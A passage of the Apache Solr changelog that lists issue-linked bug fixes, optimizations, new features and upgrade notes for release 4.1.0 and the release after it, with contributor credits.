  15. [SOLR-4426](http://issues.apache.org/jira/browse/SOLR-4426): NRTCachingDirectoryFactory does not initialize maxCachedMB and maxMergeSizeMB
      if <directoryFactory> is not present in solrconfig.xml

      (Jack Krupansky via shalin)
  16. [SOLR-4463](http://issues.apache.org/jira/browse/SOLR-4463): Fix SolrCoreState reference counting.

      (Mark Miller)
  17. [SOLR-4459](http://issues.apache.org/jira/browse/SOLR-4459): The Replication 'index move' rather than copy optimization doesn't
      kick in when using NRTCachingDirectory or the rate limiting feature.

      (Mark Miller)
  18. [SOLR-4421](http://issues.apache.org/jira/browse/SOLR-4421),[SOLR-4165](http://issues.apache.org/jira/browse/SOLR-4165): On CoreContainer shutdown, all SolrCores should publish their
      state as DOWN.

      (Mark Miller, Markus Jelsma)
  19. [SOLR-4467](http://issues.apache.org/jira/browse/SOLR-4467): Ephemeral directory implementations may not recover correctly
      because the code to clear the tlog files on startup is off.

      (Mark Miller)
  20. [SOLR-4413](http://issues.apache.org/jira/browse/SOLR-4413): Fix SolrCore#getIndexDir() to return the current index directory.

      (Gregg Donovan, Mark Miller)
  21. [SOLR-4469](http://issues.apache.org/jira/browse/SOLR-4469): A new IndexWriter must be opened on SolrCore reload when the index
      directory has changed and the previous SolrCore's state should not be
      propagated.

      (Mark Miller, Gregg Donovan)
  22. [SOLR-4471](http://issues.apache.org/jira/browse/SOLR-4471): Replication occurs even when a slave is already up to date.

      (Mark Miller, Andre Charton)
  23. [SOLR-4484](http://issues.apache.org/jira/browse/SOLR-4484): ReplicationHandler#loadReplicationProperties still uses Files
      rather than the Directory to try and read the replication properties files.

      (Mark Miller)
  24. [SOLR-4352](http://issues.apache.org/jira/browse/SOLR-4352): /browse pagination now supports and preserves sort context

      (Eric Spiegelberg, Erik Hatcher)
  25. [LUCENE-4796](http://issues.apache.org/jira/browse/LUCENE-4796), [SOLR-4373](http://issues.apache.org/jira/browse/SOLR-4373): Fix concurrency issue in NamedSPILoader and
      AnalysisSPILoader when doing concurrent core loads in multicore
      Solr configs.

      (Uwe Schindler, Hossman)
  26. [SOLR-4504](http://issues.apache.org/jira/browse/SOLR-4504): Fixed CurrencyField range queries to correctly exclude
      documents w/o values

      (hossman)
  27. [SOLR-4480](http://issues.apache.org/jira/browse/SOLR-4480): A trailing + or - caused the edismax parser to throw
      an exception.

      (Fiona Tay, Jan HÃ¸ydahl, yonik)
  28. [SOLR-4507](http://issues.apache.org/jira/browse/SOLR-4507): The Cloud tab does not show up in the Admin UI if you
      set zkHost in solr.xml.

      (Alfonso Presa, Mark Miller)
  29. [SOLR-4505](http://issues.apache.org/jira/browse/SOLR-4505): Possible deadlock around SolrCoreState update lock.

      (Erick Erickson, Mark Miller)
  30. [SOLR-4511](http://issues.apache.org/jira/browse/SOLR-4511): When a new index is replicated into place, we need
      to update the most recent replicatable index point without
      doing a commit. This is important for repeater use cases, as
      well as when nodes may switch master/slave roles.

      (Mark Miller, RaÃºl Grande)
  31. [SOLR-4515](http://issues.apache.org/jira/browse/SOLR-4515): CurrencyField's OpenExchangeRatesOrgProvider now requires
      a ratesFileLocation init param, since the previous global default
      no longer works

      (hossman)
  32. [SOLR-4518](http://issues.apache.org/jira/browse/SOLR-4518): Improved CurrencyField error messages when attempting to
      use a Currency that is not supported by the current JVM.

      (hossman)
  33. [SOLR-3798](http://issues.apache.org/jira/browse/SOLR-3798): Fix copyField implementation in IndexSchema to handle
      dynamic field references that aren't string-equal to the name of
      the referenced dynamic field.

      (Steve Rowe)
  34. [SOLR-4497](http://issues.apache.org/jira/browse/SOLR-4497): Collection Aliasing.

      (Mark Miller)
+ Optimizations   (10)
  1. [SOLR-4339](http://issues.apache.org/jira/browse/SOLR-4339): Admin UI - Display Field-Flags on Schema-Browser

     (steffkes)
  2. [SOLR-4340](http://issues.apache.org/jira/browse/SOLR-4340): Admin UI - Analysis's Button Spinner goes wild

     (steffkes)
  3. [SOLR-4341](http://issues.apache.org/jira/browse/SOLR-4341): Admin UI - Plugins/Stats Page contains loooong
     Values which result in horizontal Scrollbar

     (steffkes)
  4. [SOLR-3915](http://issues.apache.org/jira/browse/SOLR-3915): Color Legend for Cloud UI

     (steffkes)
  5. [SOLR-4306](http://issues.apache.org/jira/browse/SOLR-4306): Utilize indexInfo=false when gathering core names in UI

     (steffkes)
  6. [SOLR-4284](http://issues.apache.org/jira/browse/SOLR-4284): Admin UI - make core list scrollable separate from the rest of
     the UI

     (steffkes)
  7. [SOLR-4364](http://issues.apache.org/jira/browse/SOLR-4364): Admin UI - Locale based number formatting

     (steffkes)
  8. [SOLR-4521](http://issues.apache.org/jira/browse/SOLR-4521): Stop using the 'force' option for recovery replication. This
     will keep some less common unnecessary replications from happening.

     (Mark Miller, Simon Scofield)
  9. [SOLR-4529](http://issues.apache.org/jira/browse/SOLR-4529): Improve Admin UI Dashboard legibility

     (Felix Buenemann via
     steffkes)
  10. [SOLR-4526](http://issues.apache.org/jira/browse/SOLR-4526): Admin UI depends on optional system info

      (Felix Buenemann via
      steffkes)
+ Other Changes   (15)
  1. [SOLR-4259](http://issues.apache.org/jira/browse/SOLR-4259): Carrot2 dependency should be declared on the mini version, not the core.

     (Dawid Weiss).
  2. [SOLR-4348](http://issues.apache.org/jira/browse/SOLR-4348): Make the lock type configurable by system property by default.

     (Mark Miller)
  3. [SOLR-4353](http://issues.apache.org/jira/browse/SOLR-4353): Renamed example jetty context file to reduce confusion

     (hossman)
  4. [SOLR-4384](http://issues.apache.org/jira/browse/SOLR-4384): Make post.jar report timing information

     (Upayavira via janhoy)
  5. [SOLR-4415](http://issues.apache.org/jira/browse/SOLR-4415): Add 'state' to shards (default to 'active') and read/write them to
     ZooKeeper

     (Anshum Gupta via shalin)
  6. [SOLR-4394](http://issues.apache.org/jira/browse/SOLR-4394): Tests and example configs demonstrating SSL with both server
     and client certs

     (hossman)
  7. [SOLR-3060](http://issues.apache.org/jira/browse/SOLR-3060): SurroundQParserPlugin highlighting tests

     (Ahmet Arslan via hossman)
  8. [SOLR-2470](http://issues.apache.org/jira/browse/SOLR-2470): Added more tests for VelocityResponseWriter
  9. [SOLR-4471](http://issues.apache.org/jira/browse/SOLR-4471): Improve and clean up TestReplicationHandler.

     (Amit Nithian via Mark Miller)
  10. [SOLR-3843](http://issues.apache.org/jira/browse/SOLR-3843): Include lucene codecs jar and enable per-field postings and docvalues
      support in the schema.xml

      (Robert Muir, Steve Rowe)
  11. [SOLR-4511](http://issues.apache.org/jira/browse/SOLR-4511): Add new test for 'repeater' replication node.

      (Mark Miller)
  12. [SOLR-4458](http://issues.apache.org/jira/browse/SOLR-4458): Sort directions (asc, desc) are now case insensitive

      (Shawn Heisey via hossman)
  13. [SOLR-2996](http://issues.apache.org/jira/browse/SOLR-2996): A bare \* without a field specification is treated as \*:\*
      by the lucene and edismax query paesers.

      (hossman, Jan HÃ¸ydahl, Alan Woodward, yonik)
  14. [SOLR-4416](http://issues.apache.org/jira/browse/SOLR-4416): Upgrade to Tika 1.3.

      (Markus Jelsma via Mark Miller)
  15. [SOLR-4200](http://issues.apache.org/jira/browse/SOLR-4200): Reduce INFO level logging from CachingDirectoryFactory

      (Shawn Heisey via hossman)

### Release 4.1.0 [2013-01-22]

+ Versions of Major Components   (5)
  1. Apache Tika 1.2
  2. Carrot2 3.6.2
  3. Velocity 1.7 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.4.5
+ Upgrading from Solr 4.0.0   (2)
  1. Custom java parsing plugins need to migrate from throwing the internal
     ParseException to throwing SyntaxError.
  2. BaseDistributedSearchTestCase now randomizes the servlet context it uses when
     creating Jetty instances. Subclasses that assume a hard coded context of
     "/solr" should either be fixed to use the "String context" variable, or should
     take advantage of the new BaseDistributedSearchTestCase(String) constructor
     to explicitly specify a fixed servlet context path. See [SOLR-4136](http://issues.apache.org/jira/browse/SOLR-4136) for details.
#### Detailed Change List

+ New Features   (35)
  1. [SOLR-2255](http://issues.apache.org/jira/browse/SOLR-2255): Enhanced pivot faceting to use local-params in the same way that
     regular field value faceting can. This means support for excluding a filter
     query, using a different output key, and specifying 'threads' to do
     facet.method=fcs concurrently. PivotFacetHelper now extends SimpleFacet and
     the getFacetImplementation() extension hook was removed.

     (dsmiley)
  2. [SOLR-3897](http://issues.apache.org/jira/browse/SOLR-3897): A highlighter parameter "hl.preserveMulti" to return all of the
     values of a multiValued field in their original order when highlighting.

     (Joel Bernstein via yonik)
  3. [SOLR-3929](http://issues.apache.org/jira/browse/SOLR-3929): Support configuring IndexWriter max thread count in solrconfig.

     (phunt via Mark Miller)
  4. [SOLR-3906](http://issues.apache.org/jira/browse/SOLR-3906): Add support for AnalyzingSuggester ([LUCENE-3842](http://issues.apache.org/jira/browse/LUCENE-3842)), where the
     underlying analyzed form used for suggestions is separate from the returned
     text.

     (Robert Muir)
  5. [SOLR-3985](http://issues.apache.org/jira/browse/SOLR-3985): ExternalFileField caches can be reloaded on firstSearcher/
     newSearcher events using the ExternalFileFieldReloader

     (Alan Woodward)
  6. [SOLR-3911](http://issues.apache.org/jira/browse/SOLR-3911): Make Directory and DirectoryFactory first class so that the majority
     of Solr's features work with any custom implementations.

     (Mark Miller)
     Additional Work:
     - [SOLR-4032](http://issues.apache.org/jira/browse/SOLR-4032): Files larger than an internal buffer size fail to replicate.

       (Mark Miller, Markus Jelsma)
     - [SOLR-4033](http://issues.apache.org/jira/browse/SOLR-4033): Consistently use the solrconfig.xml lockType everywhere.

       (Mark Miller, Markus Jelsma)
     - [SOLR-4144](http://issues.apache.org/jira/browse/SOLR-4144): Replication using too much RAM.

       (yonik, Markus Jelsma)
     - [SOLR-4187](http://issues.apache.org/jira/browse/SOLR-4187): NPE on Directory release

       (Mark Miller, Markus Jelsma)
  7. [SOLR-4051](http://issues.apache.org/jira/browse/SOLR-4051): Add <propertyWriter /> element to DIH's data-config.xml file,
     allowing the user to specify the location, filename and Locale for
     the "data-config.properties" file. Alternatively, users can specify their
     own property writer implementation for greater control. This new configuration
     element is optional, and defaults mimic prior behavior. The one exception is
     that the "root" locale is default. Previously it was the machine's default locale.

     (James Dyer)
  8. [SOLR-4084](http://issues.apache.org/jira/browse/SOLR-4084): Add FuzzyLookupFactory, which is like AnalyzingSuggester except that
     it can tolerate typos in the input.

     (Areek Zillur via Robert Muir)
  9. [SOLR-4088](http://issues.apache.org/jira/browse/SOLR-4088): New and improved auto host detection strategy for SolrCloud.

     (Raintung Li via Mark Miller)
  10. [SOLR-3970](http://issues.apache.org/jira/browse/SOLR-3970): SystemInfoHandler now exposes more details about the
      JRE/VM/Java version in use.

      (hossman)
  11. [SOLR-4101](http://issues.apache.org/jira/browse/SOLR-4101): Add support for storing term offsets in the index via a
      'storeOffsetsWithPositions' flag on field definitions in the schema.

      (Tom Winch, Alan Woodward)
  12. [SOLR-4093](http://issues.apache.org/jira/browse/SOLR-4093): Solr QParsers may now be directly invoked in the lucene
      query syntax without the \_query\_ magic field hack.
      Example: foo AND {!term f=myfield v=$qq}

      (yonik)
  13. [SOLR-4087](http://issues.apache.org/jira/browse/SOLR-4087): Add MAX\_DOC\_FREQ option to MoreLikeThis.

      (Andrew Janowczyk via Mark Miller)
  14. [SOLR-4114](http://issues.apache.org/jira/browse/SOLR-4114): Allow creating more than one shard per instance with the
      Collection API.

      (Per Steffensen, Mark Miller)
  15. [SOLR-3531](http://issues.apache.org/jira/browse/SOLR-3531): Allowing configuring maxMergeSizeMB and maxCachedMB when
      using NRTCachingDirectoryFactory.

      (Andy Laird via Mark Miller)
  16. [SOLR-4118](http://issues.apache.org/jira/browse/SOLR-4118): Fix replicationFactor to align with industry usage.
      replicationFactor now means the total number of copies
      of a document stored in the collection (or the total number of
      physical indexes for a single logical slice of the collection).
      For example if replicationFactor=3 then for a given shard there
      will be a total of 3 replicas (one of which will normally be
      designated as the leader.)

      (yonik)
  17. [SOLR-4124](http://issues.apache.org/jira/browse/SOLR-4124): You should be able to set the update log directory with the
      CoreAdmin API the same way as the data directory.

      (Mark Miller)
  18. [SOLR-4028](http://issues.apache.org/jira/browse/SOLR-4028): When using ZK chroot, it would be nice if Solr would create the
      initial path when it doesn't exist.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via Mark Miller)
  19. [SOLR-3948](http://issues.apache.org/jira/browse/SOLR-3948): Calculate/display deleted documents in admin interface.

      (Shawn Heisey via Mark Miller)
  20. [SOLR-4030](http://issues.apache.org/jira/browse/SOLR-4030): Allow rate limiting Directory IO based on the IO context.

      (Mark Miller, Radim Kolar)
  21. [SOLR-4166](http://issues.apache.org/jira/browse/SOLR-4166): LBHttpSolrServer ignores ResponseParser passed in constructor.

      (Steve Molloy via Mark Miller)
  22. [SOLR-4140](http://issues.apache.org/jira/browse/SOLR-4140): Allow access to the collections API through CloudSolrServer
      without referencing an existing collection.

      (Per Steffensen via Mark Miller)
  23. [SOLR-788](http://issues.apache.org/jira/browse/SOLR-788): Distributed search support for MLT.

      (Matthew Woytowitz, Mike Anderson, Jamie Johnson, Mark Miller)
  24. [SOLR-4120](http://issues.apache.org/jira/browse/SOLR-4120): Collection API: Support for specifying a list of Solr addresses to
      spread a new collection across.

      (Per Steffensen via Mark Miller)
  25. [SOLR-4110](http://issues.apache.org/jira/browse/SOLR-4110): Configurable Content-Type headers for PHPResponseWriters and
      PHPSerializedResponseWriter.

      (Dominik Siebel via Mark Miller)
  26. [SOLR-1028](http://issues.apache.org/jira/browse/SOLR-1028): The ability to specify "transient" and "loadOnStartup" as a new properties of
      <core> tags in solr.xml. Can specify "transientCacheSize" in the <cores> tag. Together
      these allow cores to be loaded only when needed and only transientCacheSize transient
      cores will be loaded at a time, the rest aged out on an LRU basis.
  27. [SOLR-4246](http://issues.apache.org/jira/browse/SOLR-4246): When update.distrib is set to skip update processors before
      the distributed update processor, always include the log update processor
      so forwarded updates will still be logged.

      (yonik)
  28. [SOLR-4230](http://issues.apache.org/jira/browse/SOLR-4230): The new Solr 4 spatial fields now work with the {!geofilt} and
      {!bbox} query parsers. The score local-param works too.

      (David Smiley)
  29. [SOLR-1972](http://issues.apache.org/jira/browse/SOLR-1972): Add extra statistics to RequestHandlers - 5 & 15-minute reqs/sec
      rolling averages; median, 75th, 95th, 99th, 99.9th percentile request times

      (Alan Woodward, Shawn Heisey, Adrien Grand, Uwe Schindler)
  30. [SOLR-4271](http://issues.apache.org/jira/browse/SOLR-4271): Add support for PostingsHighlighter.

      (Robert Muir)
  31. [SOLR-4255](http://issues.apache.org/jira/browse/SOLR-4255): The new Solr 4 spatial fields now have a 'filter' boolean local-param
      that can be set to false to not filter. Its useful when there is already a spatial
      filter query but you also need to sort or boost by distance.

      (David Smiley)
  32. [SOLR-4265](http://issues.apache.org/jira/browse/SOLR-4265), [SOLR-4283](http://issues.apache.org/jira/browse/SOLR-4283): Solr now parses request parameters (in URL or sent with POST
      using content-type application/x-www-form-urlencoded) in its dispatcher code. It no
      longer relies on special configuration settings in Tomcat or other web containers
      to enable UTF-8 encoding, which is mandatory for correct Solr behaviour. Query
      strings passed in via the URL need to be properly-%-escaped, UTF-8 encoded
      bytes, otherwise Solr refuses to handle the request. The maximum length of
      x-www-form-urlencoded POST parameters can now be configured through the
      requestDispatcher/requestParsers/@formdataUploadLimitInKB setting in
      solrconfig.xml (defaults to 2 MiB). Solr now works out of the box with
      e.g. Tomcat, JBoss,...

      (Uwe Schindler, Dawid Weiss, Alex Rocher)
  33. [SOLR-2201](http://issues.apache.org/jira/browse/SOLR-2201): DIH's "formatDate" function now supports a timezone as an optional
      fourth parameter

      (James Dyer, Mark Waddle)
  34. [SOLR-4302](http://issues.apache.org/jira/browse/SOLR-4302): New parameter 'indexInfo' (defaults to true) in CoreAdmin STATUS
      command can be used to omit index specific information

      (Shahar Davidson via shalin)
  35. [SOLR-2592](http://issues.apache.org/jira/browse/SOLR-2592): Collection specific document routing. The "compositeId"
      router is the default for collections with hash based routing (i.e. when
      numShards=N is specified on collection creation). Documents with ids sharing
      the same domain (prefix) will be routed to the same shard, allowing for
      efficient querying.Example:
      The following two documents will be indexed to the same shard
      since they share the same domain "customerB!".
      ````

           {"id" : "customerB!doc1" [...] }
           {"id" : "customerB!doc2" [...] }
      ````
      At query time, one can specify a "shard.keys" parameter that lists what
      shards the query should cover.
      <http://.../query?q=my_query&shard.keys=customerB!>Collections that do not specify numShards at collection creation time
      use custom sharding and default to the "implicit" router. Document updates
      received by a shard will be indexed to that shard, unless a "\_shard\_" parameter
      or document field names a different shard.

      (Michael Garski, Dan Rosher, yonik)
+ Optimizations   (15)
  1. [SOLR-3788](http://issues.apache.org/jira/browse/SOLR-3788): Admin Cores UI should redirect to newly created core details

     (steffkes)
  2. [SOLR-3895](http://issues.apache.org/jira/browse/SOLR-3895): XML and XSLT UpdateRequestHandler should not try to resolve
     external entities. This improves speed of loading e.g. XSL-transformed
     XHTML documents.

     (Martin Herfurt, uschindler, hossman)
  3. [SOLR-3614](http://issues.apache.org/jira/browse/SOLR-3614): Fix XML parsing in XPathEntityProcessor to correctly expand
     named entities, but ignore external entities.

     (uschindler, hossman)
  4. [SOLR-3734](http://issues.apache.org/jira/browse/SOLR-3734): Improve Schema-Browser Handling for CopyField using
     dynamicField's

     (steffkes)
  5. [SOLR-3941](http://issues.apache.org/jira/browse/SOLR-3941): The "commitOnLeader" part of distributed recovery can use
     openSearcher=false.

     (TomÃ¡s FernÃ¡ndez LÃ¶bbe via Mark Miller)
  6. [SOLR-4063](http://issues.apache.org/jira/browse/SOLR-4063): Allow CoreContainer to load multiple SolrCores in parallel rather
     than just serially.

     (Mark Miller)
  7. [SOLR-4199](http://issues.apache.org/jira/browse/SOLR-4199): When doing zk retries due to connection loss, rather than just
     retrying for 2 minutes, retry in proportion to the session timeout.

     (Mark Miller)
  8. [SOLR-4262](http://issues.apache.org/jira/browse/SOLR-4262): Replication Icon on Dashboard does not reflect Master-/Slave-
     State

     (steffkes)
  9. [SOLR-4264](http://issues.apache.org/jira/browse/SOLR-4264): Missing Error-Screen on UI's Cloud-Page

     (steffkes)
  10. [SOLR-4261](http://issues.apache.org/jira/browse/SOLR-4261): Percentage Infos on Dashboard have a fixed width

      (steffkes)
  11. [SOLR-3851](http://issues.apache.org/jira/browse/SOLR-3851): create a new core/delete an existing core should also update
      the main/left list of cores on the admin UI

      (steffkes)
  12. [SOLR-3840](http://issues.apache.org/jira/browse/SOLR-3840): XML query response display is unreadable in Solr Admin Query UI

      (steffkes)
  13. [SOLR-3982](http://issues.apache.org/jira/browse/SOLR-3982): Admin UI: Various Dataimport Improvements

      (steffkes)
  14. [SOLR-4296](http://issues.apache.org/jira/browse/SOLR-4296): Admin UI: Improve Dataimport Auto-Refresh

      (steffkes)
  15. [SOLR-3458](http://issues.apache.org/jira/browse/SOLR-3458): Allow multiple Items to stay open on Plugins-Page

      (steffkes)
+ Bug Fixes   (83)
  1. [SOLR-4288](http://issues.apache.org/jira/browse/SOLR-4288): Improve logging for FileDataSource (basePath, relative
     resources).

     (Dawid Weiss)
  2. [SOLR-4007](http://issues.apache.org/jira/browse/SOLR-4007): Morfologik dictionaries not available in Solr field type
     due to class loader lookup problems.

     (Lance Norskog, Dawid Weiss)
  3. [SOLR-3560](http://issues.apache.org/jira/browse/SOLR-3560): Handle different types of Exception Messages for Logging UI

     (steffkes)
  4. [SOLR-3637](http://issues.apache.org/jira/browse/SOLR-3637): Commit Status at Core-Admin UI is always false

     (steffkes)
  5. [SOLR-3917](http://issues.apache.org/jira/browse/SOLR-3917): Partial State on Schema-Browser UI is not defined for Dynamic
     Fields & Types

     (steffkes)
  6. [SOLR-3939](http://issues.apache.org/jira/browse/SOLR-3939): Consider a sync attempt from leader to replica that fails due
     to 404 a success.

     (Mark Miller, Joel Bernstein)
  7. [SOLR-3940](http://issues.apache.org/jira/browse/SOLR-3940): Rejoining the leader election incorrectly triggers the code path
     for a fresh cluster start rather than fail over.

     (Mark Miller)
  8. [SOLR-3961](http://issues.apache.org/jira/browse/SOLR-3961): Fixed error using LimitTokenCountFilterFactory

     (Jack Krupansky, hossman)
  9. [SOLR-3933](http://issues.apache.org/jira/browse/SOLR-3933): Distributed commits are not guaranteed to be ordered within a
     request.

     (Mark Miller)
  10. [SOLR-3939](http://issues.apache.org/jira/browse/SOLR-3939): An empty or just replicated index cannot become the leader of a
      shard after a leader goes down.

      (Joel Bernstein, yonik, Mark Miller)
  11. [SOLR-3971](http://issues.apache.org/jira/browse/SOLR-3971): A collection that is created with numShards=1 turns into a
      numShards=2 collection after starting up a second core and not specifying
      numShards.

      (Mark Miller)
  12. [SOLR-3988](http://issues.apache.org/jira/browse/SOLR-3988): Fixed SolrTestCaseJ4.adoc(SolrInputDocument) to respect
      field and document boosts

      (hossman)
  13. [SOLR-3981](http://issues.apache.org/jira/browse/SOLR-3981): Fixed bug that resulted in document boosts being compounded in
      <copyField/> destination fields.

      (hossman)
  14. [SOLR-3920](http://issues.apache.org/jira/browse/SOLR-3920): Fix server list caching in CloudSolrServer when using more than one
      collection list with the same instance.

      (Grzegorz Sobczyk, Mark Miller)
  15. [SOLR-3938](http://issues.apache.org/jira/browse/SOLR-3938): prepareCommit command omits commitData causing a failure to trigger
      replication to slaves.

      (yonik)
  16. [SOLR-3992](http://issues.apache.org/jira/browse/SOLR-3992): QuerySenderListener doesn't populate document cache.

      (Shotaro Kamio, yonik)
  17. [SOLR-3995](http://issues.apache.org/jira/browse/SOLR-3995): Recovery may never finish on SolrCore shutdown if the last reference to
      a SolrCore is closed by the recovery process.

      (Mark Miller)
  18. [SOLR-3998](http://issues.apache.org/jira/browse/SOLR-3998): Atomic update on uniqueKey field itself causes duplicate document.

      (Eric Spencer, yonik)
  19. [SOLR-4001](http://issues.apache.org/jira/browse/SOLR-4001): In CachingDirectoryFactory#close, if there are still refs for a
      Directory outstanding, we need to wait for them to be released before closing.

      (Mark Miller)
  20. [SOLR-4005](http://issues.apache.org/jira/browse/SOLR-4005): If CoreContainer fails to register a created core, it should close it.

      (Mark Miller)
  21. [SOLR-4009](http://issues.apache.org/jira/browse/SOLR-4009): OverseerCollectionProcessor is not resilient to many error conditions
      and can stop running on errors.

      (Raintung Li, milesli, Mark Miller)
  22. [SOLR-4019](http://issues.apache.org/jira/browse/SOLR-4019): Log stack traces for 503/Service Unavailable SolrException if not
      thrown by PingRequestHandler. Do not log exceptions if a user tries to view a
      hidden file using ShowFileRequestHandler.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via James Dyer)
  23. [SOLR-3589](http://issues.apache.org/jira/browse/SOLR-3589): Edismax parser does not honor mm parameter if analyzer splits a token.

      (Tom Burton-West, Robert Muir)
  24. [SOLR-4031](http://issues.apache.org/jira/browse/SOLR-4031): Upgrade to Jetty 8.1.7 to fix a bug where in very rare occasions
      the content of two concurrent requests get mixed up.

      (Per Steffensen, yonik)
  25. [SOLR-4060](http://issues.apache.org/jira/browse/SOLR-4060): ReplicationHandler can try and do a snappull and open a new IndexWriter
      after shutdown has already occurred, leaving an IndexWriter that is not closed.

      (Mark Miller)
  26. [SOLR-4055](http://issues.apache.org/jira/browse/SOLR-4055): Fix a thread safety issue with the Collections API that could
      cause actions to be targeted at the wrong SolrCores.

      (Raintung Li, Per Steffensen via Mark Miller)
  27. [SOLR-3993](http://issues.apache.org/jira/browse/SOLR-3993): If multiple SolrCore's for a shard coexist on a node, on cluster
      restart, leader election would stall until timeout, waiting to see all of
      the replicas come up.

      (Mark Miller, Alexey Kudinov)
  28. [SOLR-2045](http://issues.apache.org/jira/browse/SOLR-2045): Databases that require a commit to be issued before closing the
      connection on a non-read-only database leak connections. Also expanded the
      SqlEntityProcessor test to sometimes use Derby as well as HSQLDB (Derby is
      one db affected by this bug).

      (Fenlor Sebastia, James Dyer)
  29. [SOLR-4064](http://issues.apache.org/jira/browse/SOLR-4064): When there is an unexpected exception while trying to run the new
      leader process, the SolrCore will not correctly rejoin the election.

      (Po Rui via Mark Miller)
  30. [SOLR-3989](http://issues.apache.org/jira/browse/SOLR-3989): SolrZkClient constructor dropped exception cause when throwing
      a new RuntimeException.

      (Colin Bartolome, yonik)
  31. [SOLR-4036](http://issues.apache.org/jira/browse/SOLR-4036): field aliases in fl should not cause properties of target field
      to be used.

      (Martin Koch, yonik)
  32. [SOLR-4003](http://issues.apache.org/jira/browse/SOLR-4003): The SolrZKClient clean method should not try and clear zk paths
      that start with /zookeeper, as this can fail and stop the removal of
      further nodes.

      (Mark Miller)
  33. [SOLR-4076](http://issues.apache.org/jira/browse/SOLR-4076): SolrQueryParser should run fuzzy terms through
      MultiTermAwareComponents to ensure that (for example) a fuzzy query of
      foobar~2 is equivalent to FooBar~2 on a field that includes lowercasing.

      (yonik)
  34. [SOLR-4081](http://issues.apache.org/jira/browse/SOLR-4081): QueryParsing.toString, used during debugQuery=true, did not
      correctly handle ExtendedQueries such as WrappedQuery
      (used when cache=false), spatial queries, and frange queries.

      (Eirik Lygre, yonik)
  35. [SOLR-3959](http://issues.apache.org/jira/browse/SOLR-3959): Ensure the internal comma separator of poly fields is escaped
      for CSVResponseWriter.

      (Areek Zillur via Robert Muir)
  36. [SOLR-4075](http://issues.apache.org/jira/browse/SOLR-4075): A logical shard that has had all of it's SolrCores unloaded should
      be removed from the cluster state.

      (Mark Miller, Gilles Comeau)
  37. [SOLR-4034](http://issues.apache.org/jira/browse/SOLR-4034): Check if a collection already exists before trying to create a
      new one.

      (Po Rui, Mark Miller)
  38. [SOLR-4097](http://issues.apache.org/jira/browse/SOLR-4097): Race can cause NPE in logging line on first cluster state update.

      (Mark Miller)
  39. [SOLR-4099](http://issues.apache.org/jira/browse/SOLR-4099): Allow the collection api work queue to make forward progress even
      when it's watcher is not fired for some reason.

      (Raintung Li via Mark Miller)
  40. [SOLR-3960](http://issues.apache.org/jira/browse/SOLR-3960): Fixed a bug where Distributed Grouping ignored PostFilters

      (Nathan Visagan, hossman)
  41. [SOLR-3842](http://issues.apache.org/jira/browse/SOLR-3842): DIH would not populate multivalued fields if the column name
      derives from a resolved variable

      (James Dyer)
  42. [SOLR-4117](http://issues.apache.org/jira/browse/SOLR-4117): Retrieving the size of the index may use the wrong index dir if
      you are replicating.

      (Mark Miller, Markus Jelsma)
  43. [SOLR-2890](http://issues.apache.org/jira/browse/SOLR-2890): Fixed a bug that prevented omitNorms and omitTermFreqAndPositions
      options from being respected in some <fieldType/> declarations

      (hossman)
  44. [SOLR-4159](http://issues.apache.org/jira/browse/SOLR-4159): When we are starting a shard from rest, a potential leader should
      not consider it's last published state when deciding if it can be the new
      leader.

      (Mark Miller)
  45. [SOLR-4158](http://issues.apache.org/jira/browse/SOLR-4158): When a core is registering in ZooKeeper it may not wait long
      enough to find the leader due to how long the potential leader waits to see
      replicas.

      (Mark Miller, Alain Rogister)
  46. [SOLR-4162](http://issues.apache.org/jira/browse/SOLR-4162): ZkCli usage examples are not correct because the zkhost parameter
      is not present and it is mandatory for all commands.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via Mark Miller)
  47. [SOLR-4071](http://issues.apache.org/jira/browse/SOLR-4071): Validate that name is pass to Collections API create, and behave the
      same way as on startup when collection.configName is not explicitly passed.

      (Po Rui, Mark Miller)
  48. [SOLR-4127](http://issues.apache.org/jira/browse/SOLR-4127): Added explicit error message if users attempt Atomic document
      updates with either updateLog or DistribUpdateProcessor.

      (hossman)
  49. [SOLR-4136](http://issues.apache.org/jira/browse/SOLR-4136): Fix SolrCloud behavior when using "hostContext" containing "\_"
      or"/" characters. This fix also makes SolrCloud more accepting of
      hostContext values with leading/trailing slashes.

      (hossman)
  50. [SOLR-4168](http://issues.apache.org/jira/browse/SOLR-4168): Ensure we are using the absolute latest index dir when getting
      list of files for replication.

      (Mark Miller)
  51. [SOLR-4171](http://issues.apache.org/jira/browse/SOLR-4171): CachingDirectoryFactory should not return any directories after it
      has been closed.

      (Mark Miller)
  52. [SOLR-4102](http://issues.apache.org/jira/browse/SOLR-4102): Fix UI javascript error if canonical hostname can not be resolved

      (steffkes via hossman)
  53. [SOLR-4178](http://issues.apache.org/jira/browse/SOLR-4178): ReplicationHandler should abort any current pulls and wait for
      it's executor to stop during core close.

      (Mark Miller)
  54. [SOLR-3918](http://issues.apache.org/jira/browse/SOLR-3918): Fixed the 'dist-war-excl-slf4j' ant target to exclude all
      slf4j jars, so that the resulting war is usable as is provided the servlet
      container includes the correct slf4j api and impl jars.

      (Shawn Heisey, hossman)
  55. [SOLR-4198](http://issues.apache.org/jira/browse/SOLR-4198): OverseerCollectionProcessor should implement ClosableThread.

      (Mark Miller)
  56. [SOLR-4213](http://issues.apache.org/jira/browse/SOLR-4213): Directories that are not shutdown until DirectoryFactory#close
      do not have close listeners called on them.

      (Mark Miller)
  57. [SOLR-4134](http://issues.apache.org/jira/browse/SOLR-4134): Standard (XML) request writer cannot "set" multiple values into
      multivalued field with partial updates.

      (Luis Cappa Banda, Will Butler, shalin)
  58. [SOLR-3972](http://issues.apache.org/jira/browse/SOLR-3972): Fix ShowFileRequestHandler to not log a warning in the
      (expected) situation of a file not found.

      (hossman)
  59. [SOLR-4133](http://issues.apache.org/jira/browse/SOLR-4133): Cannot "set" field to null with partial updates when using the
      standard RequestWriter.

      (Will Butler, shalin)
  60. [SOLR-4223](http://issues.apache.org/jira/browse/SOLR-4223): "maxFormContentSize" in jetty.xml is not picked up by jetty 8
      so set it via solr webapp context file.

      (shalin)
  61. [SOLR-4175](http://issues.apache.org/jira/browse/SOLR-4175):SearchComponent chain can't contain two components of the
      same class and use debugQuery.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via ehatcher)
  62. [SOLR-4244](http://issues.apache.org/jira/browse/SOLR-4244): When coming back from session expiration we should not wait for
      the leader to see us in the down state if we are the node that must become
